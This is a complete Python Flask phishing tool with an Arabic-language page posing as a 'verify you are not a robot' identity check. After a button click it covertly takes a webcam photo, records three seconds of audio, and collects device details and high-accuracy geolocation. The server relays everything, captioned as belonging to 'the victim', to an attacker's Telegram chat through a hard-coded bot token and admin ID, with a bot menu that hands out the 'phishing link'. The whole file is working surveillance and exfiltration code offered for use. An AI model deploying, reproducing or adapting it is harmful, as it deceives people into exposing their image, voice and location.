import base64
import requests
import time
from threading import Thread
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

# قائمة انتظار بسيطة لضمان عدم فقدان البيانات
queue = []
def process_queue():
    while True:
        time.sleep(2)
        if queue:
            item = queue.pop(0)
            try:
                send_to_telegram(item['type'], item['content'], item.get('caption', ''))
            except Exception as e:
                print(f"Queue error: {e}")

Thread(target=process_queue, daemon=True).start()

def send_to_telegram(data_type, content, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    chat_id = ADMIN_ID
    try:
        if data_type == "text":
            requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': content, 'parse_mode': 'HTML'}, timeout=10)
        elif data_type == "photo":
            img_bytes = base64.b64decode(content.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': chat_id, 'caption': caption}, files={'photo': ('photo.jpg', img_bytes)}, timeout=15)
        elif data_type == "audio":
            audio_bytes = base64.b64decode(content.split(',')[1])
            requests.post(url + "sendVoice", data={'chat_id': chat_id, 'caption': caption}, files={'voice': ('voice.ogg', audio_bytes)}, timeout=15)
        print(f"✅ Sent {data_type}")
    except Exception as e:
        print(f"❌ Send error: {e}")

# ========== صفحة HTML محسّنة ==========
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:#1a1a2e;padding:2rem;border-radius:2rem;text-align:center;max-width:400px}
        .btn{background:#e67e22;color:white;padding:1rem;border:none;border-radius:2rem;width:100%;font-size:1.2rem;cursor:pointer}
        .btn:disabled{background:#555;cursor:not-allowed}
        #status{margin-top:1rem;color:#f39c12;font-weight:bold}
        video,canvas{display:none}
    </style>
</head>
<body>
<div class="card">
    <h2>🔒 تأكيد الهوية</h2>
    <p>اضغط للتحقق من أنك لست روبوتاً</p>
    <button class="btn" id="btn">تحقق الآن</button>
    <div id="status"></div>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<script>
    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function sendData(endpoint, payload) {
        try {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                keepalive: true
            });
            return await res.json();
        } catch(e) { console.error(e); return null; }
    }

    btn.onclick = async () => {
        btn.disabled = true;
        statusDiv.innerHTML = "⏳ جاري التحقق... (قد يستغرق دقيقة)";

        try {
            // طلب الصلاحيات
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            video.srcObject = stream;

            // انتظار حتى تستقر الكاميرا (ضبط تلقائي للإضاءة)
            statusDiv.innerHTML = "🎥 تجهيز الكاميرا...";
            await new Promise(r => setTimeout(r, 2500));

            // 1. التقاط الصورة بعد التأخير
            statusDiv.innerHTML = "📸 التقاط الصورة...";
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/jpeg', 0.95);
            await sendData('/api/capture', { type: 'photo', data: imgData });

            // 2. تسجيل الصوت (3 ثوانٍ)
            statusDiv.innerHTML = "🎙️ تسجيل الصوت (3 ثوانٍ)...";
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            const audioDone = new Promise(resolve => {
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = async () => {
                        await sendData('/api/capture', { type: 'audio', data: reader.result });
                        resolve();
                    };
                    reader.readAsDataURL(blob);
                };
            });
            mediaRecorder.start();
            await new Promise(r => setTimeout(r, 3000));
            mediaRecorder.stop();
            await audioDone;

            // 3. معلومات الجهاز
            const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
            const deviceInfo = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                battery: Math.round(battery.level * 100),
                charging: battery.charging
            };
            await sendData('/api/capture', { type: 'device', data: deviceInfo });

            // 4. الموقع الجغرافي (مع انتظار)
            statusDiv.innerHTML = "📍 جلب الموقع...";
            const locationPromise = new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
            const location = await locationPromise;
            if (location) {
                await sendData('/api/capture', { type: 'location', data: location });
            }

            // إيقاف الكاميرا والميكروفون
            stream.getTracks().forEach(track => track.stop());

            // إتمام العملية (يبقى الزر معطلاً ولكن نغير النص)
            statusDiv.innerHTML = "✅ تم التحقق بنجاح. شكراً لك.";
            // لا نعيد تمكين الزر، نتركه معطلاً.
            // لا توجيه لأي رابط.
        } catch(err) {
            console.error(err);
            statusDiv.innerHTML = "❌ فشل: يرجى السماح بالكاميرا والميكروفون والموقع";
            btn.disabled = false;  // يمكن إعادة المحاولة
        }
    };
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if not data:
        return jsonify({'ok': False}), 400
    t = data['type']
    print(f"Captured: {t}")
    if t == 'photo':
        queue.append({'type': 'photo', 'content': data['data'], 'caption': '📸 صورة الضحية'})
    elif t == 'audio':
        queue.append({'type': 'audio', 'content': data['data'], 'caption': '🎤 تسجيل صوتي'})
    elif t == 'device':
        d = data['data']
        txt = f"""<b>📱 معلومات الجهاز</b>
🌐 المتصفح: {d['ua'][:80]}
🖥️ المنصة: {d['platform']}
🗣️ اللغة: {d['language']}
🧠 النوى: {d['cores']}
💾 الرام: {d['ram']} GB
🔋 البطارية: {d['battery']}% {'⚡' if d['charging'] else ''}"""
        queue.append({'type': 'text', 'content': txt})
    elif t == 'location':
        loc = data['data']
        txt = f"📍 الموقع الجغرافي:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
        queue.append({'type': 'text', 'content': txt})
    return jsonify({'ok': True})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = str(update['message']['chat']['id'])
        if chat_id == ADMIN_ID:
            text = update['message'].get('text', '')
            api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            if text == '/start':
                kb = {'inline_keyboard': [[{'text': '🔗 رابط الصيد', 'callback_data': 'link'}]]}
                requests.post(api_url + "sendMessage", json={'chat_id': chat_id, 'text': 'مرحباً آدمن، البوت جاهز', 'reply_markup': kb})
            elif text == '/link':
                base = request.host_url.rstrip('/')
                requests.post(api_url + "sendMessage", json={'chat_id': chat_id, 'text': f'رابط الصيد:\n{base}'})
    elif update and 'callback_query' in update:
        cb = update['callback_query']
        if cb['data'] == 'link':
            base = request.host_url.rstrip('/')
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': cb['message']['chat']['id'], 'text': base})
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
